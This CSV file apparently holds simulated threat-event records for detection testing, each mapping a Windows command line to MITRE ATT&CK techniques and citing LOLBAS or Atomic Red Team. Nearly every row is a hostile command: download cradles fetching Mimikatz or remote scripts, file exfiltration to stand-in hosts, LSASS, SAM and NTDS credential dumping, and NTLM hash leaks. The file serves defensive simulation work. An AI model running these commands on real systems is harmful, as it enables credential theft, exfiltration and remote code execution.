id,simulation_type,enabled,dest,description,parent_process,process_path,process_name,process,mitre_tactic,mitre_technique,sources,time_delay_seconds
PROC-TE-13,Threat Event,TRUE,WKS13,Bitsadmin.exe being used to copy cmd.exe to alternate location/name (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,"Defense Evasion
Execution
Persistence","Masquerading: Rename System Utilities
Command and Scripting Interpreter: Windows Command Shell
BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
PROC-TE-14,Threat Event,TRUE,WKS14,Certoc.exe being used for Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\certoc.exe,certoc.exe,C:\windows\system32\certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certoc/,
PROC-TE-15,Threat Event,TRUE,WKS15,CertReq.exe being used for Exfiltration (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\certreq.exe,certreq.exe,C:\Windows\System32\certreq.exe -Post -config https://hy7dy.xyz/ c:\windows\win.ini,"Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certreq/,
PROC-TE-16,Threat Event,TRUE,WKS16,Certutil.exe being used for Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\certutil.exe,certutil.exe,C:\Windows\System32\certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certutil/,
PROC-TE-17,Threat Event,TRUE,WKS17,Cmd.exe executing payload stored in Alternate Data Stream (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe - < fakefile.doc:payload.bat,Execution,Command and Scripting Interpreter: Windows Command Shell,https://lolbas-project.github.io/lolbas/Binaries/Cmd/,
PROC-TE-18,Threat Event,TRUE,WKS18,Cmd.exe exfiltration via WebDAV server (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"C:\Windows\System32\cmd.exe /C ""type C:\Public\creds.txt > \\\\193.176.183.245\pyr\creds.txt""","Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Cmd/,
PROC-TE-19,Threat Event,TRUE,WKS19,Exfiltration via ConfigSecurityPolicy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe,ConfigSecurityPolicy.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://ui78d.xyz/fiosiu?encodedfile,"Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/,
PROC-TE-20,Threat Event,TRUE,WKS20,Tool Ingress via ConfigSecurityPolicy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe,ConfigSecurityPolicy.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe https://ui78d.xyz/fiosiu,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/,
PROC-TE-21,Threat Event,TRUE,WKS21,Tool Ingress via hh.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\SysWOW64\hh.exe,hh.exe,C:\Windows\SysWOW64\hh.exe https://ui78d.xyz/fiosiu,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Hh/,
PROC-TE-22,Threat Event,TRUE,WKS22,Tool Ingress via ieexec.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe,ieexec.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe https://ui78d.xyz/fiosiu,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Ieexec/,
PROC-TE-23,Threat Event,TRUE,WKS23,Tool Ingress via MpCmdRun.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe,MpCmdRun.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe -DownloadFile -url https://ui78d.xyz/fiosiu -path c:\temp\beacon.exe,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/,
PROC-TE-24,Threat Event,TRUE,WKS24,Arbitrary Code Execution via MSDT.exe (CVE-2022-30190 - Lolbas Project),C:\Program Files\Programs\Office 2019\Office14\excel.exe,C:\Windows\System32\Msdt.exe,Msdt.exe,"C:\Windows\System32\Msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""","Defense Evasion
Execution","System Binary Proxy Execution
Exploitation for Client Execution",https://lolbas-project.github.io/lolbas/Binaries/Msdt/,
PROC-TE-25,Threat Event,TRUE,WKS25,Tool Ingress via msedge.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Microsoft\Edge\Application\msedge.exe,msedge.exe,"C:\Program Files\Microsoft\Edge\Application\msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""http://example.com/evil.b64.html"" > out.b64","Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Msedge/,
PROC-TE-26,Threat Event,TRUE,WKS26,Mshta VBS Download Cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,"C:\Windows\System32\mshta.exe vbscript:Close(Execute(""GetObject(""""script:https://ui78d.xyz/ac.sct"""")""))","Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Mshta
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
PROC-TE-27,Threat Event,TRUE,WKS27,Mshta JavaScript Download Cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,"C:\Windows\System32\mshta.exe javascript:a=GetObject(""script:https://ui78d.xyz/al.sct"").Exec();close();","Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Mshta
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
PROC-TE-28,Threat Event,TRUE,WKS28,Mshta Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,C:\Windows\System32\mshta.exe https://ui78d.xyz/fiosiu,"Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Mshta
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
PROC-TE-29,Threat Event,TRUE,WKS29,Msiexec download cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\msiexec.exe,msiexec.exe,C:\Windows\System32\msiexec.exe /q /i http://ui78d.xyz/tmp/cmd.png,"Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Msiexec
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Msiexec/,
PROC-TE-30,Threat Event,TRUE,WKS30,Ngen.exe Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe,ngen.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe http://ui78d.xyz/tmp/cmd.png,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Ngen/,
PROC-TE-31,Threat Event,TRUE,WKS31,LSASS Dumping via rdrleakdiag.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\rdrleakdiag.exe,rdrleakdiag.exe,C:\windows\system32\rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /wait 1,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/,
PROC-TE-32,Threat Event,TRUE,WKS32,Credential Dumping via reg save (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\reg.exe,reg.exe,C:\windows\system32\reg.exe save HKLM\SECURITY c:\test\security.bak && reg save HKLM\SYSTEM c:\test\system.bak && reg save HKLM\SAM c:\test\sam.bak,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Reg/,
PROC-TE-33,Threat Event,TRUE,WKS33,Tool Ingress via regsvr32.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\regsvr32.exe,regsvr32.exe,C:\Windows\System32\regsvr32.exe /s /n /u /i:http://ui78d.xyz/tmp/cmd.sct scrobj.dll,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/,
PROC-TE-34,Threat Event,TRUE,WKS34,Tool Ingress via replace.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\replace.exe,replace.exe,C:\Windows\System32\replace.exe \\\\webdav.host.xyz\foo\bar.exe c:\Public\ /A,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Replace/,
PROC-TE-35,Threat Event,TRUE,WKS35,NTLM hash leak via rpcping (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\rpcping.exe,rpcping.exe,C:\Windows\System32\rpcping.exe -s 193.176.183.245 -e 1234 -a privacy -u NTLM,"Credential Access
Execution","Forced Authentication
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rpcping/,
PROC-TE-36,Threat Event,TRUE,WKS36,Rundll32 cradle via UNC path (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,rundll32.exe,"C:\Windows\System32\rundll32.exe \\\\193.176.183.245\share\payload.dll,EntryPoint","Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rundll32/,
PROC-TE-37,Threat Event,TRUE,WKS37,NTDS.dit theft via Wbadmin.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\wbadmin.exe,wbadmin.exe,"C:\Windows\System32\wbadmin start backup -backupTarget:C:\temp\ -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet","Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/,
PROC-TE-38,Threat Event,TRUE,WKS38,Tool Ingress via msedge_proxy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe,msedge_proxy.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe http://193.176.183.245/a.sh,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/,
PROC-TE-39,Threat Event,TRUE,WKS39,Dump LSASS.exe Memory using renamed ProcDump (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\joebob\Documents\onedrive.exe,onedrive.exe,C:\Users\joebob\Documents\onedrive.exe -accepteula -ma lsass.exe C:\Windows\Temp\lssd.dmp,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/OtherMSBinaries/Procdump/,
PROC-TE-40,Threat Event,TRUE,WKS40,Dump LSASS.exe Memory using comsvcs.dll (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,rundll32.exe,"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full","Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Libraries/comsvcs/,
PROC-TE-41,Threat Event,TRUE,WKS41,Dump LSASS.exe Memory using Out-Minidump.ps1 (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -Type Directory C:\Users\joebob\ART\ExternalPayloads\ -ErrorAction Ignore -Force | Out-Null try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop} catch{ $_; exit $_.Exception.Response.StatusCode.Value__} get-process lsass | Out-Minidump,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
PROC-TE-42,Threat Event,TRUE,WKS42,Offline Credential Theft With Mimikatz (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\joebob\Documents\onedrive.exe,onedrive.exe,"C:\Users\joebob\Documents\onedrive.exe ""sekurlsa::minidump %tmp%\lss.DMP"" ""sekurlsa::logonpasswords full"" exit","Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
PROC-TE-43,Threat Event,TRUE,WKS43,Powershell Mimikatz Cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
PROC-TE-44,Threat Event,TRUE,WKS44,Registry dumping via reg.exe (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\sam %temp%\sam,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-45,Threat Event,TRUE,WKS45,Registry dumping via reg.exe (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\system %temp%\system,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-46,Threat Event,TRUE,WKS46,Registry dumping via reg.exe (v3 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\security %temp%\security,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-47,Threat Event,TRUE,WKS47,esentutl.exe SAM copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\esentutl.exe,esentutl.exe,C:\Windows\System32\esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-48,Threat Event,TRUE,WKS48,Dump volume shadow copy hives with certutil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"C:\Windows\System32\cmd.exe for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*","Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-49,Threat Event,TRUE,WKS49,WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') samfile -consoleoutput -noninteractive,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-50,Threat Event,TRUE,WKS50,Dumping of SAM creds and secrets via Reg Export (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\sam %temp%\sam,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-51,Threat Event,TRUE,WKS51,Dumping of SAM creds and secrets via Reg Export (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\system %temp%\system,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-52,Threat Event,TRUE,WKS52,Dumping of SAM creds and secrets via Reg Export (v3 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\security %temp%\security,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-53,Threat Event,TRUE,WKS53,Create Volume Shadow Copy with vssadmin (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\vssadmin.exe,vssadmin.exe,C:\Windows\System32\vssadmin.exe create shadow /for=C,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-54,Threat Event,TRUE,WKS54,Dump Active Directory Database with NTDSUtil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\ntdsutil.exe,ntdsutil.exe,"C:\Windows\System32\ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\out"" q q","Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-55,Threat Event,TRUE,WKS55,Create Volume Shadow Copy with WMI (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wmic.exe,wmic.exe,C:\Windows\System32\wmic.exe shadowcopy call create Volume=C:\,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-56,Threat Event,TRUE,WKS56,Create Volume Shadow Copy with Powershell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe (gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')","Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-57,Threat Event,TRUE,WKS57,Create Symlink to Volume Shadow Copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\vssadmin.exe,vssadmin.exe,C:\Windows\System32\vssadmin.exe create shadow /for=C:\ && mklink /D C:\Temp\vssstore \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-58,Threat Event,TRUE,WKS58,Create Volume Shadow Copy with diskshadow (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\diskshadow.exe,diskshadow.exe,C:\Windows\System32\diskshadow.exe /s C:\Windows\Temp\T1003.003\src\diskshadow.txt,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
